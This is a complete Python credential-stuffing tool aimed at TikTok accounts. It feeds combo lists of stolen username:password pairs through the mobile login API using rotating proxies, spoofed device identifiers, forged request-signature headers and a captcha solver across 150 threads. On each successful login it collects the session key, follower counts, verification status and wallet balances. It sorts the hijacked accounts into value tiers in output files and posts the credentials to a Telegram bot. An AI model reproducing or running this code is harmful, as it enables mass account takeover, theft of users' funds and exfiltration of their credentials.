from pickle import FALSE
import threading
import cursor; cursor.hide()
import os
from datetime import datetime
from pystyle import *
import json
import urllib.parse
from urllib.parse import *
from json import dumps
import ast
import concurrent.futures
import hashlib, json
import requests
import base64
import random
from time         import time
from hashlib      import md5
from signature import signature
import uuid
from uuid            import uuid4
import string
from string                import ascii_lowercase, ascii_uppercase, digits
from colorama import Fore, Style, init
from validate_email import validate_email
import random, time, json,  uuid;
from time import sleep
from sign import sign
import enchant.checker
import queue
import binascii
from solverr import *
import hashlib,time,secrets,string,requests,json


init(autoreset=True)
stop_condition = False
info_executed = False


mean_checker = enchant.checker.SpellChecker("en_US")


proxy =  open('proxy.txt','r').read().splitlines()

proxylist = []
for prox in proxy:
           proxylist.append(prox)
           randomproxy = str(random.choice(proxylist))
prx={'https': f'http://{randomproxy}','http': f'http://{randomproxy}'}















class Bruteforce:
    def __init__(self, device, proxy):
        self.device      = device
        self.did         = self.device[0]
        self.iid         = self.device[1]
        self.device_type         = self.device[2]
        self.device_brand         = self.device[3]
        self.os_version         = self.device[4]
        self.cdid         = self.device[5]
        self.openudid         = self.device[6]
        self.proxy       = proxy
        self.checks      = 0

    
    def __solve_captcha(self) -> None:
        __captcha_challeng = Solver(self.did,self.iid)
        return __captcha_challeng


    def encrypt(self, string):
           encrypted = ""
           for char in string:
               charCode = ord(char) ^ 5
               encrypted += format(charCode, '02x')
           return encrypted

    def login(self, mode: str, username: str, password: str) -> requests.Response:
        for x in range(2):
            if self.__solve_captcha()["code"] == 200:
                try:

                    country='ma'
                    email1 = self.encrypt(username)
                    passw1 = self.encrypt(password)
                    


                    Hostt = ["api2.musical.ly","api19-normal-c-useast1a.tiktokv.com","api16-normal-c-useast1a.tiktokv.com","api2-16-h2.musical.ly","api21-h2.tiktokv.com"]
                    rd = random.choice(Hostt)

                    url = f"https://api2.musical.ly/passport/user/login/?passport-sdk-version=19&iid={self.iid}&device_id={self.did}&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=320906&version_name=32.9.6&device_platform=android&os=android&ab_version=32.9.5&ssmix=a&device_type={self.device_type}&device_brand={self.device_brand}&language=en&os_api=25&os_version={self.os_version}&openudid={self.openudid}&manifest_version_code=320905&resolution=720*1280&dpi=320&update_version_code=320905&_rticket={str(time.time()*1000)[:13]}&is_pad=0&app_type=normal&sys_region={country.upper()}&mcc_mnc=50514&timezone_name=Australia/Sydney&ts={str(time.time()*1000)[:10]}&timezone_offset=-37800&build_number=32.9.5&region={country.upper()}&carrier_region={country.upper()}&uoo=0&app_language=en&op_region={country.upper()}&ac2=wifi&host_abi=armeabi-v7a&cdid={self.cdid}&support_webview=1&okhttp_version=4.2.137.40-tiktok&use_store_region_cookie=1"

                    params = url[url.index('?') + 1:]
                    data = None
                    if "@" in username and validate_email(username):
                       data = f"mix_mode=1&username=&email={email1}&mobile=&account=&password={passw1}&multi_login=0&captcha="
                    else:
                       data = f"mix_mode=1&username={email1}&email=&mobile=&account=&password={passw1}&multi_login=0&captcha="



                    params = url[url.index('?') + 1:]
    

                    cc="AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9))
                    sig = signature(params=params, data=data, cookies=cc).get_value()
                    X_Khronos = sig['X-Khronos']
                    X_Gorgon = sig['X-Gorgon']

                    ssr = sign(url.split('?')[1],data)
                    x_ladon = ssr['x-ladon']
                    x_argus = ssr['x-argus']


                    headers = {
         #   'X-Ss-Stub': x_ss_stub,
            'Passport-Sdk-Version': '19',
         #   'X-Ss-Req-Ticket': x_log["x-ss-req-ticket"],
            'Sdk-Version': '2',
            'X-Tt-Dm-Status': 'login=0;ct=0;rt=7',
            'X-Tt-Bypass-Dp': '1',
            'X-Vc-Bdturing-Sdk-Version': '2.3.4.i18n',
            'user-agent': f'com.zhiliaoapp.musically/310905 (Linux; U; Android {self.os_version}; en_{country.upper()}; {self.device_type}; Build/RP1A.200720.012;tt-ok/3.12.13.4-tiktok)',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
             "X-Argus": x_argus,
             "X-Gorgon": X_Gorgon,
             "X-Khronos": str(X_Khronos),
             "X-Ladon": x_ladon,
        }
                    return requests.post(
                        url     = url,
                        data    = data, 
                        headers = headers, 
                        proxies = prx,
                        #allow_redirects=False
                    )
                except Exception as e:
                    print(e)
                    continue


from urllib.parse import parse_qs

class Api:
    def __init__(self, device: tuple, proxy: str, userid: str, session_key: str):
        """Initializes the Api class with device, proxy, and user information."""
        self.device = device
        self.proxy = proxy
        self.userid = userid
        self.session_key = session_key
        self.device_info = {
            "did": device[0],
            "iid": device[1],
            "device_type": device[2],
            "device_brand": device[3],
            "os_version": device[4],
            "cdid": device[5],
            "openudid": device[6]
        }

    def Get_level(self,uid):

        try:

           url = f"https://webcast22-normal-c-alisg.tiktokv.com/webcast/user/?user_role=&request_from=profile_card_v2&sec_anchor_id=&request_from_scene=1&need_preload_room=false&target_uid={uid}&anchor_id=&packed_level=2&need_block_status=true&current_room_id=&manifest_version_code=2019091803&_rticket=&app_language=ar&app_type=normal&iid={self.device_info['iid']}&channel=googleplay&device_type=AGM3-W09HN&language=ar&locale=ar&resolution=1200*1920&openudid=&update_version_code=2019091803&ac2=wifi5g&sys_region=SA&os_api=31&uoo=0&is_my_cn=0&timezone_name=Asia%2FAmman&dpi=320&ac=wifi&device_id={self.device_info['did']}&pass-route=1&os_version=12&timezone_offset=10800&version_code=130103&app_name=musical_ly&ab_version=13.1.3&version_name=13.1.3&device_brand=HONOR&ssmix=a&pass-region=1&device_platform=android&build_number=13.1.3&region=SA&aid=1233&ts=&webcast_sdk_version=3610&webcast_language=en&webcast_locale=en_US&es_version=3&effect_sdk_version=17.6.0&current_network_quality_info=%7B%7D"

           params = url[url.index('?') + 1:]
           sig = signature(params=params, data=None, cookies=None).get_value()
           X_Khronos = sig['X-Khronos']
           X_Gorgon = sig['X-Gorgon']

           ssr = sign(url.split('?')[1])
           x_ladon = ssr['x-ladon']
           x_argus = ssr['x-argus']



           headers = {
   'Host': 'webcast22-normal-c-alisg.tiktokv.com',
    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1;',
    # 'Accept-Encoding': 'gzip, deflate',
    "X-Argus": x_argus,
    "X-Gorgon": X_Gorgon,
    "X-Khronos": str(X_Khronos),
    "X-Ladon": x_ladon,
    'Connection': 'close',
    }
           response = requests.get(
    url,
    headers=headers,
           )
           #print(response.text)

           level = response.text.split(',"level":"')[1].split('","')[0]
           #print(level)
           return level
        except Exception as e:
                    print(e)
                    pass
                    #continue

    def get_userinfo(self) -> tuple[str, str, str, str, str]:
        """Fetches user information from TikTok web API."""
        try:
            url = f"https://web-i18n.tiktok.com/@{self.userid}"
            headers = {
                "Host": "web-i18n.tiktok.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
            }
            response = requests.get(url, headers=headers).text

            follower_count = response.split('"followerCount":')[1].split(',"')[0]
            #print(follower_count)
            verified_status = response.split('"verified":')[1].split(',"')[0]
            #print(verified_status)
            user_id = response.split('"webapp.user-detail":{"userInfo":{"user":{"id":"')[1].split('","')[0]
            #print(user_id)
            user_data = response.split('"webapp.user-detail":{"userInfo":{"user":{')[1].split(',"statusMsg":"","needFix":')[0]
            #print(user_data)
            heart_count = user_data.split('"heart":"')[1].split('","heartCount":')[0]
            country_code = "None"
            #print(country_code)

            return follower_count, verified_status, user_id, heart_count, country_code
        except Exception as e:
            print(e)
            return "", "", "", "", ""

    def get_coin(self) -> dict:
        """Fetches coin data from TikTok wallet API."""
        headers = {
            "Host": "webcast22-normal-c-alisg.tiktokv.com",
            "cookie": f"sessionid={self.session_key}",
            "Passport-Sdk-Version": "17",
            "User-Agent": (
                "com.zhiliaoapp.musically/2021704040 (Linux; U; Android 6.0.1; en_US; Aziz; "
                "Build/V417IR; Cronet/TTNetVersion:82326b0c 2020-08-05 QuicVersion:0144d358 2020-03-24)"
            )
        }
        url = (
            f"https://webcast22-normal-c-alisg.tiktokv.com/webcast/wallet_api_tiktok/mywallet/"
            f"?request_tag_from=h5&os_api=23&device_type=Aziz&ssmix=a&manifest_version_code=2021704040"
            f"&dpi=300&uoo=0&region=US&app_name=musical_ly&version_name=17.4.4&timezone_offset=-18000"
            f"&ts=00&ab_version=17.4.4&pass-route=1&cpu_support64=false&pass-region=1&storage_type=0"
            f"&ac2=wifi&appTheme=light&app_type=normal&ac=wifi&host_abi=armeabi-v7a"
            f"&update_version_code=2021704040&channel=googleplay&_rticket=00&device_platform=android"
            f"&iid={self.device_info['iid']}&build_number=17.4.4&locale=en&op_region=CN"
            f"&version_code=170404&timezone_name=America%2FNew_York&cdid=00"
            f"&openudid=00&sys_region=US&device_id={self.device_info['did']}&app_language=en"
            f"&resolution=900*1600&os_version=6.0.1&language=en&device_brand=Aziz&aid=1233"
        )
        return requests.get(url, headers=headers, proxies={"http": self.proxy, "https": self.proxy}).json()
    

class ThreadsHandler:
    def __init__(self, combos: list, threads: int) -> None:
        """Initializes the ThreadsHandler with combos and thread count."""
        
        def setup_queue(combinations):
            """Sets up a queue with the provided combinations."""
            q = queue.Queue()
            for combo in combinations:
                q.put(combo)
            return q

        def create_results_directory():
            """Creates results directory and a timestamped subdirectory."""
            base_dir = "results"
            timestamp = datetime.now().strftime("%m_%d_%H_%M_%S")
            sub_dir = f"{base_dir}/{timestamp}"
            try:
                os.makedirs(sub_dir, exist_ok=True)
            except Exception as e:
                print(f"Error creating directory: {e}")
            return sub_dir

        def load_config(file_path="data/config.json"):
            """Loads configuration from a JSON file."""
            try:
                with open(file_path, "r") as f:
                    return json.load(f)
            except FileNotFoundError:
                print(f"Config file {file_path} not found.")
                return {}
            except json.JSONDecodeError:
                print(f"Error decoding {file_path}.")
                return {}

        def read_file_lines(file_path):
            """Reads lines from a file, returning an empty list if file is missing."""
            try:
                with open(file_path, "r") as f:
                    return f.read().splitlines()
            except FileNotFoundError:
                print(f"File {file_path} not found.")
                return []

        # Initialize queue
        self.combos_queue = setup_queue(combos)

        # Setup results directory
        self.results_path = create_results_directory()

        # Load configuration
        self.config = load_config()
        self.mode = self.config.get("mode", "")
        self.log_file = self.config.get("logging", {}).get("file") if self.config.get("logging", {}).get("enabled") else None
        self.tele = self.config.get("tele", {}).get("file") if self.config.get("tele", {}).get("enabled") else None

        # Initialize thread and data settings
        self.threads = threads
        self.combos = combos
        self.to_check = len(combos)
        
        # Load proxies and devices
        self.proxies = read_file_lines("proxy.txt")
        self.dev = read_file_lines("device.txt")

        # Initialize error codes
        self.loggedin = [1381, 2033, 2032, 1039, 2135]
        self.captcha = [1107, 7, 1105, 1108]
        self.faa = [2046]

        # Initialize counters
        self.success = 0
        self.fails = 0
        self.followers_0k = 0
        self.followers_1k = 0
        self.followers_10k = 0
        self.followers_100k = 0
        self.followers_1M = 0
        self.followers_0k_SEC = 0
        self.followers_1k_SEC = 0
        self.followers_10k_SEC = 0
        self.followers_100k_SEC = 0
        self.followers_1M_SEC = 0
        self.is_verified = 0
        self.users_3l = 0
        self.users_4l = 0
        self.users_2l = 0
        self.have_mean = 0
        self.coin = 0
        self.mony = 0
        self.sec = 0
        self.fa = 0
        self.rety = 0
        self.nn = 0
        self.rs = 0


    def __login_request(self, username: str, password: str) -> bool and dict:
        try:
            proxy          = random.choice(self.proxies)
            devicee        = random.choice(self.dev)
            os_version = f'{random.randint(7, 33)}.{random.randint(0, 9)}.{random.randint(0, 9)}'
            did = devicee.split(":")[1]
            iid = devicee.split(":")[0]
            device_type = devicee.split(":")[2]
            device_brand = devicee.split(":")[3]
            cdid = devicee.split(":")[5]
            openudid = devicee.split(":")[4]
            device = did, iid, device_type, device_brand, os_version, cdid, openudid

            login_response = Bruteforce(device, proxy).login(self.mode, username, password)
            #print(f'resp:{login_response.json()}')
            if login_response is not None:
               if self.log_file is not None:
                   with open(self.log_file, "a") as f:
                       f.write(str(f'({login_response.text}:{device}:{username}:{password})') + "\n")
            
            if login_response.json()['data'].get('error_code') is None:
                try:
                    #print('good')
                    userid = login_response.json()["data"]["username"]
                    ses = login_response.json()['data']['session_key']
                    info = Api(device, proxy, userid, ses).get_userinfo()
                    follow = info[0]
                    verified = info[1]
                    uid = info[2]
                    heart = info[3]
                    country_name = info[4]
                    level = Api(device, proxy, userid, ses).Get_level(uid)
                    info = follow
                    coin = Api(device, proxy, userid, ses).get_coin()
                    #print(f'info={info}')
                    #print(coin)
                    
                    return True, login_response.json(), info, coin, level, heart, country_name
                except Exception as e:
                            print(e)
                            pass
                
                return True, login_response.json(), {}, {}, {}, {}, {}
            
            elif login_response.json()['data'].get('error_code') in self.loggedin:
                self.sec+=1
                if '@' in username:
                    with open(f"{self.results_path}/Secure.txt", "a") as f:
                       f.write(f'{username}:{password}\n')
                else:
                   info = Api(device, proxy, username, 'ses').get_userinfo()
                   follow = info[0]
                   verified = info[1]
                   uid = info[2]
                   heart = info[3]
                   country_name = info[4]
                   level = Api(device, proxy, username, 'ses').Get_level(uid)
                   info = follow
                   end_dataa = f"SECURE | @{username} | {username}:{password} | Followers: {follow} | Heart: {heart} | Level: {level} | Verified: {verified}\n"
                   if str(verified) == "true":
                     self.is_verified += 1
                     with open(f"{self.results_path}/verified-Secure.txt", "a") as f:
                       f.write(end_dataa)
                       requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                   else: 
                     with open(f"{self.results_path}/Secure.txt", "a") as f:
                       f.write(end_dataa)
                       with open(f"{self.results_path}/All_Secure.txt", "a") as f:
                                   f.write(f'{username}:{password}\n')
                       requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                       if len(str(follow)) < 4:
                           self.followers_0k_SEC += 1
                           with open(f"{self.results_path}/Secure-0k-1k.txt", "a") as f:
                               f.write(end_dataa)
                       elif len(str(follow)) == 4:
                           self.followers_1k_SEC += 1
                           with open(f"{self.results_path}/Secure-1k-9k.txt", "a") as f:
                               f.write(end_dataa)
                       elif len(str(follow)) == 5:
                           self.followers_10k_SEC += 1
                           with open(f"{self.results_path}/Secure-10k-99k.txt", "a") as f:
                               f.write(end_dataa)
                       elif len(str(follow)) == 6:
                           self.followers_100k_SEC += 1
                           with open(f"{self.results_path}/Secure-100k-999k.txt", "a") as f:
                               f.write(end_dataa)
                       elif len(str(follow)) == 7:
                           self.followers_1M_SEC += 1
                           with open(f"{self.results_path}/Secure-1M+.txt", "a") as f:
                               f.write(end_dataa)
                return False, login_response.json(), {}, {}, {}, {}, {}
            elif login_response.json()['data'].get('error_code') in self.faa:
                self.fa+=1
                if '@' in username:
                    with open(f"{self.results_path}/2fa.txt", "a") as f:
                       f.write(f'{username}:{password}\n')
                else:
                   info = Api(device, proxy, username, 'ses').get_userinfo()
                   follow = info[0]
                   verified = info[1]
                   uid = info[2]
                   heart = info[3]
                   country_name = info[4]
                   level = Api(device, proxy, username, 'ses').Get_level(uid)
                   info = follow
                   if str(verified) == "true":
                     self.is_verified += 1
                     end_dataa = f"2FA | @{username} | {username}:{password} | Followers: {follow} | Heart: {heart} | Level: {level} | Verified: {verified}\n"
                     with open(f"{self.results_path}/verified-2FA.txt", "a") as f:
                       f.write(end_dataa)
                       requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                   else: 
                     end_dataa = f"2FA | @{username} | {username}:{password} | Followers: {follow} | Heart: {heart} | Level: {level} | Verified: {verified}\n"
                     with open(f"{self.results_path}/2fa.txt", "a") as f:
                       f.write(end_dataa)
                       requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                return False, login_response.json(), {}, {}, {}, {}, {}
            elif login_response.json()['data'].get('error_code') in self.captcha:
                try:
                    self.rety+=1
                    proxy          = random.choice(self.proxies)
                    devicee        = random.choice(self.dev)
                    os_version = f'{random.randint(7, 33)}.{random.randint(0, 9)}.{random.randint(0, 9)}'
                    did = devicee.split(":")[1]
                    iid = devicee.split(":")[0]
                    device_type = devicee.split(":")[2]
                    device_brand = devicee.split(":")[3]
                    cdid = devicee.split(":")[5]
                    openudid = devicee.split(":")[4]
                    device = did, iid, device_type, device_brand, os_version, cdid, openudid
                    
                    
                    
                    
                    
                    
                    login_response = Bruteforce(device, proxy).login(self.mode, username, password)
                    #print(f'resp:{login_response.json()}')
                    
                    if login_response is not None:
                       if self.log_file is not None:
                          with open(self.log_file, "a") as f:
                              f.write(str(f'({login_response.text}:{device}:{username}:{password})') + "\n")
                    
                    if login_response.json()['data'].get('error_code') is None:
                        try:
                            #print('good')
                            userid = login_response.json()['data']['username']
                            ses = login_response.json()['data']['session_key']
                            info = Api(device, proxy, userid, ses).get_userinfo()
                            follow = info[0]
                            verified = info[1]
                            uid = info[2]
                            heart = info[3]
                            country_name = info[4]
                            level = Api(device, proxy, userid, ses).Get_level(uid)
                            info = follow
                            coin = Api(device, proxy, userid, ses).get_coin()
                            #print(f'info={info}')
                            #print(coin)
                            
                            return True, login_response.json(), info, coin, level, heart, country_name
                        except Exception as e:
                            print(e)
                            pass
                        
                        return True, login_response.json(), {}, {}, {}, {}, {}
                    
                    elif login_response.json()['data'].get('error_code') in self.loggedin:
                        self.sec+=1
                        if '@' in username:
                            with open(f"{self.results_path}/Secure.txt", "a") as f:
                               f.write(f'{username}:{password}\n')
                        else:
                           info = Api(device, proxy, username, 'ses').get_userinfo()
                           follow = info[0]
                           verified = info[1]
                           uid = info[2]
                           heart = info[3]
                           country_name = info[4]
                           level = Api(device, proxy, username, 'ses').Get_level(uid)
                           info = follow
                           end_dataa = f"SECURE | @{username} | {username}:{password} | Followers: {follow} | Heart: {heart} | Level: {level} | Verified: {verified}\n"
                           if str(verified) == "true":
                             self.is_verified += 1
                             with open(f"{self.results_path}/verified-Secure.txt", "a") as f:
                               f.write(end_dataa)
                               requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                           else:
                             with open(f"{self.results_path}/Secure.txt", "a") as f:
                               f.write(end_dataa)
                               with open(f"{self.results_path}/All_Secure.txt", "a") as f:
                                   f.write(f'{username}:{password}\n')
                               requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                               if len(str(follow)) < 4:
                                   self.followers_0k_SEC += 1
                                   with open(f"{self.results_path}/Secure-0k-1k.txt", "a") as f:
                                       f.write(end_dataa)
                               elif len(str(follow)) == 4:
                                   self.followers_1k_SEC += 1
                                   with open(f"{self.results_path}/Secure-1k-9k.txt", "a") as f:
                                       f.write(end_dataa)
                               elif len(str(follow)) == 5:
                                   self.followers_10k_SEC += 1
                                   with open(f"{self.results_path}/Secure-10k-99k.txt", "a") as f:
                                       f.write(end_dataa)
                               elif len(str(follow)) == 6:
                                   self.followers_100k_SEC += 1
                                   with open(f"{self.results_path}/Secure-100k-999k.txt", "a") as f:
                                       f.write(end_dataa)
                               elif len(str(follow)) == 7:
                                   self.followers_1M_SEC += 1
                                   with open(f"{self.results_path}/Secure-1M+.txt", "a") as f:
                                       f.write(end_dataa)
                        return False, login_response.json(), {}, {}, {}, {}, {}
                    elif login_response.json()['data'].get('error_code') in self.faa:
                        self.fa+=1
                        if '@' in username:
                            with open(f"{self.results_path}/2fa.txt", "a") as f:
                               f.write(f'{username}:{password}\n')
                               endd=f'{username}:{password}'
                               requests.post(f'https://api.telegram.org/{self.tele}&text={endd}')
                        else:
                           info = Api(device, proxy, username, 'ses').get_userinfo()
                           follow = info[0]
                           verified = info[1]
                           uid = info[2]
                           heart = info[3]
                           country_name = info[4]
                           level = Api(device, proxy, username, 'ses').Get_level(uid)
                           info = follow
                           if str(verified) == "true":
                             self.is_verified += 1
                             end_dataa = f"2FA | @{username} | {username}:{password} | Followers: {follow} | Heart: {heart} | Level: {level} | Verified: {verified}\n"
                             with open(f"{self.results_path}/verified-2FA.txt", "a") as f:
                               f.write(end_dataa)
                               requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                           else: 
                             end_dataa = f"2FA | @{username} | {username}:{password} | Followers: {follow} | Heart: {heart} | Level: {level} | Verified: {verified}\n"
                             with open(f"{self.results_path}/2fa.txt", "a") as f:
                               f.write(end_dataa)
                               requests.post(f'https://api.telegram.org/{self.tele}&text={end_dataa}')
                        return False, login_response.json(), {}, {}, {}, {}, {}
                    else:
                        return False, {}, {}, {}, {}, {}, {}
                    
                except Exception as e:
                    #print(f'resp:{login_response.json()}')
                    print(e)
                    return False, {}, {}, {}, {}, {}, {}
            
            else:
                #print(f'resp:{login_response.json()}')
                return False, {}, {}, {}, {}, {}, {}
            
        except Exception as e:
            print(e)
            return False, {}, {}, {}, {}, {}, {}
    
    def __title_loop(self):
        if os.name == "nt":
            while True:
                os.system(f"title SELL -- ( Hits: {self.success} -- Bads: {self.fails} -- Checked: {self.success + self.fails}->{self.to_check} )")
                time.sleep(1.6)

    def __cli_loop(self):
        if os.name == "nt":
            while True:
                secend = self.success + self.fails
                time.sleep(1)
                self.rs = self.success + self.fails - secend
                CPM = self.rs * 60
                os.system('cls' if os.name == 'nt' else 'clear')
                ss=(f"""{Style.BRIGHT}{Fore.LIGHTGREEN_EX}
            [>] Information{Fore.RESET}
            [+] Hits:       {Fore.GREEN}{self.success}{Fore.RESET}
            [+] Bads:       {Fore.RED}{self.fails}{Fore.RESET}
            [+] Rety:       {Fore.RED}{self.rety}{Fore.RESET}
            [+] CPM:        {Fore.RED}{CPM}{Fore.RESET}
            [+] Checked:    {self.success + self.fails}/{self.to_check}
            {Fore.LIGHTGREEN_EX}
            [>] Followers{Fore.RESET}
            [+] 0-1K:       {self.followers_0k}
            [+] 1K-10K:     {self.followers_1k}
            [+] 10K-100K:   {self.followers_10k}
            [+] 100K-999K:  {self.followers_100k}
            [+] +1M:        {self.followers_1M}
            {Fore.LIGHTGREEN_EX}
            [>] Secure{Fore.RESET}
            [+] 0-1K:       {self.followers_0k_SEC}
            [+] 1K-10K:     {self.followers_1k_SEC}
            [+] 10K-100K:   {self.followers_10k_SEC}
            [+] 100K-999K:  {self.followers_100k_SEC}
            [+] +1M:        {self.followers_1M_SEC}
            {Fore.LIGHTGREEN_EX}
            [>] Others{Fore.RESET}
            [+] Verified:   {self.is_verified}
            [+] Secure:     {self.sec}
            [+] 2fa:        {self.fa}
            [+] Coins:      {self.coin}
            [+] money:      {self.mony}
            """)
                print(ss)

                time.sleep(1)



    def __brute_account(self):
        """Processes account combinations and logs results based on specific conditions."""
    
        def save_and_notify(file_name, data, counter=None, extra_data=""):
            """Helper function to save data to file and send Telegram notification if needed."""
            with open(f"{self.results_path}/{file_name}", "a") as f:
                f.write(data + (extra_data + "\n" if extra_data else "\n"))
            if file_name not in ["all.txt", "Level_Acc.txt", "sessions.txt"]:
                requests.post(f"https://api.telegram.org/{self.tele}&text={data}{extra_data}")
            if counter is not None:
               counter += 1

        while not self.combos_queue.empty():
            user = self.combos_queue.get()
            try:
                username, password = user.split(":")
                success, login_data, follow, coin, level, heart, country_name = self.__login_request(username, password)

                if not success:
                    self.fails += 1
                    continue

                self.success += 1
                end_data = (
                f"@{login_data['data']['username']} | {username}:{password} | "
                f"Followers: {follow} | Heart: {heart} | Level: {level} | "
                f"Verified: {login_data['data']['user_verified']} | "
                f"Email: {login_data['data']['email_collected']} | "
                f"Phone: {login_data['data']['phone_collected']} | "
                f"{login_data['data']['session_key']}"
            )

                # Save to all.txt
                save_and_notify("all.txt", end_data)

            # Save accounts with level > 0
                if level and str(level).isdigit() and int(level) > 0:
                    save_and_notify("Level_Acc.txt", end_data)

            # Save accounts with 4-letter usernames
                if len(str(login_data['data']['username'])) == 4:
                    save_and_notify("4Ls.txt", end_data, self.users_4l)

            # Save accounts with 3-letter usernames
                if len(str(login_data['data']['username'])) == 3:
                    save_and_notify("3Ls.txt", end_data, self.users_3l)

            # Save accounts with 1-2 letter usernames
                if 0 < len(str(login_data['data']['username'])) < 3:
                   save_and_notify("1-2Ls.txt", end_data, self.users_2l)

            # Save accounts with <1k followers and session key
                if len(str(follow)) < 4:
                    save_and_notify("0k-1k.txt", end_data, self.followers_0k)
                    with open(f"{self.results_path}/sessions.txt", "a") as f:
                        f.write(f"{login_data['data']['session_key']}\n")

            # Save accounts with 1k-9k followers
                if len(str(follow)) == 4:
                    save_and_notify("1k-9k.txt", end_data, self.followers_1k)

            # Save accounts with 10k-99k followers
                if len(str(follow)) == 5:
                    save_and_notify("10k-99k.txt", end_data, self.followers_10k)

            # Save accounts with 100k-999k followers
                if len(str(follow)) == 6:
                    save_and_notify("100k-999k.txt", end_data, self.followers_100k)

            # Save accounts with 1M+ followers
                if len(str(follow)) == 7:
                    save_and_notify("1M+.txt", end_data, self.followers_1M)

            # Save verified accounts
                if str(login_data['data']['user_verified']) != "False":
                    save_and_notify("verified.txt", end_data, self.is_verified)

            # Save accounts with withdrawal money
                money = coin['data']['my_wallet']['withdrawal_money']
                if money > 0:
                    self.mony += money
                    save_and_notify("money.txt", end_data, None, f" | money:{money}")

            # Save accounts with diamond coins
                coins = coin['data']['my_wallet']['diamond_count']
                if coins > 0:
                    self.coin += coins
                    save_and_notify("coin.txt", end_data, None, f" | coin:{coins}")

            except Exception as e:
                with open(f"{self.results_path}/errors.txt", "a") as f:
                    f.write(f"{username}:{password}:{e}\n")

    def main(self):
        """Manages the execution of title, CLI, and brute account threads."""
        # Start title and CLI loops in separate threads
        threads_to_start = [
            (self.__title_loop, "Title Loop"),
            (self.__cli_loop, "CLI Loop")
        ]
    
        for func, name in threads_to_start:
            thread = threading.Thread(target=func, name=name)
            thread.daemon = True  # Make threads daemon to exit when main program exits
            thread.start()
    
        # Use ThreadPoolExecutor for brute account tasks
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit brute account tasks for execution
            for _ in range(self.threads):
                executor.submit(self.__brute_account)

from concurrent.futures import ThreadPoolExecutor
import threading
import subprocess
import platform

def clear_screen():
    """Clears the console screen based on the operating system."""
    try:
        subprocess.run('cls' if platform.system() == 'Windows' else 'clear', shell=True, check=True)
    except subprocess.CalledProcessError:
        print("Failed to clear the screen.")

def load_combinations(file_path):
    """Loads combinations from a file and returns them as a list."""
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: File {file_path} not found.")
        return []
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

def run_threads(combinations, thread_count):
    """Runs the ThreadsHandler with the given combinations and thread count."""
    if combinations:
        ThreadsHandler(combinations, thread_count).main()
    else:
        print("No combinations loaded. Exiting.")

if __name__ == "__main__":
    THREAD_COUNT = 150
    COMBO_FILE_PATH = "./data/combo.txt"

    clear_screen()
    print("Loading Combos..")
    combos = load_combinations(COMBO_FILE_PATH)
    run_threads(combos, THREAD_COUNT)